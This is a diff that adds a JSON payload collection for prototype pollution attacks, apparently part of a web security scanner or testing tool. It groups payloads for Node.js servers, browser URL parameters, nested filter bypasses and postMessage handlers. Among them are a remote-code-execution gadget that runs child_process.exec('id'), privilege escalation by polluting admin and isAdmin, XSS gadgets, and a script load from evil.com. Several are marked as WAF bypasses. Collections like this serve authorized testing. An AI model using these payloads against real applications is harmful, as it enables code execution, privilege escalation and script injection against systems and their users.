@@ -1,0 +1,43 @@
+{
+  "category": "prototype_pollution",
+  "contexts": {
+    "server_side": {
+      "description": "Node.js/Express server-side prototype pollution via JSON body merge operations",
+      "payloads": [
+        {"payload": "{\"__proto__\":{\"polluted\":\"canary_7x8k2\"}}", "description": "Basic __proto__ detection — pollutes Object.prototype with canary value", "waf_bypass": false},
+        {"payload": "{\"constructor\":{\"prototype\":{\"polluted\":\"canary_7x8k2\"}}}", "description": "Constructor path pollution — alternative to __proto__ that bypasses some filters", "waf_bypass": true},
+        {"payload": "{\"__proto__\":{\"status\":510}}", "description": "Status code pollution — overrides default HTTP status in Express/Koa responses", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"admin\":true}}", "description": "Privilege escalation — pollutes admin property checked in authorization logic", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"isAdmin\":true}}", "description": "Privilege escalation variant — common isAdmin property used in access control", "waf_bypass": false},
+        {"payload": "{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"argv\":[\"-e\",\"require('child_process').exec('id')\"]}}", "description": "RCE via child_process.spawn — pollutes shell/argv used by execSync or spawn", "waf_bypass": false}
+      ]
+    },
+    "client_side": {
+      "description": "Client-side prototype pollution via URL query parameters or hash fragments",
+      "payloads": [
+        {"payload": "?__proto__[polluted]=canary_7x8k2", "description": "Query param pollution — exploits vulnerable URL parsers (qs, query-string)", "waf_bypass": false},
+        {"payload": "#__proto__[polluted]=canary_7x8k2", "description": "Hash fragment pollution — bypasses server-side WAF since hash is client-only", "waf_bypass": true},
+        {"payload": "?__proto__[innerHTML]=<img/src/onerror=alert(1)>", "description": "DOM gadget via innerHTML — triggers XSS when polluted property is used in DOM", "waf_bypass": false},
+        {"payload": "?__proto__[src]=//evil.com/xss.js", "description": "Script src gadget — injects external script via polluted src property", "waf_bypass": false},
+        {"payload": "?constructor[prototype][polluted]=canary", "description": "Constructor path via query params — bypasses __proto__ keyword filters", "waf_bypass": true},
+        {"payload": "?__proto__[srcdoc]=<script>alert(1)</script>", "description": "Iframe srcdoc gadget — injects script content via polluted iframe srcdoc attribute", "waf_bypass": false}
+      ]
+    },
+    "nested_bypass": {
+      "description": "Bypass prototype pollution filters via nested objects and obfuscation",
+      "payloads": [
+        {"payload": "{\"a\":{\"__proto__\":{\"polluted\":\"canary\"}}}", "description": "Nested object pollution — bypasses shallow key checks that only inspect top-level keys", "waf_bypass": true},
+        {"payload": "{\"__pro__proto__to__\":{\"polluted\":\"canary\"}}", "description": "Concatenation bypass — exploits string normalization that strips inner __proto__", "waf_bypass": true},
+        {"payload": "[{\"__proto__\":{\"polluted\":\"canary\"}}]", "description": "Array wrapper — bypasses filters that only check plain object inputs", "waf_bypass": true},
+        {"payload": "{\"constructor\":{\"prototype\":{\"constructor\":{\"prototype\":{\"polluted\":\"canary\"}}}}}", "description": "Deep constructor chain — bypasses single-depth prototype checks", "waf_bypass": true}
+      ]
+    },
+    "postmessage": {
+      "description": "Prototype pollution via window.postMessage cross-origin messaging",
+      "payloads": [
+        {"payload": "JSON.parse('{\"__proto__\":{\"polluted\":\"canary\"}}')", "description": "JSON merge via postMessage — exploits message handlers that merge received data", "waf_bypass": false},
+        {"payload": "{\"type\":\"config\",\"data\":{\"__proto__\":{\"isAdmin\":true}}}", "description": "Config message pollution — targets handlers that merge config/settings objects", "waf_bypass": false}
+      ]
+    }
+  }
+}
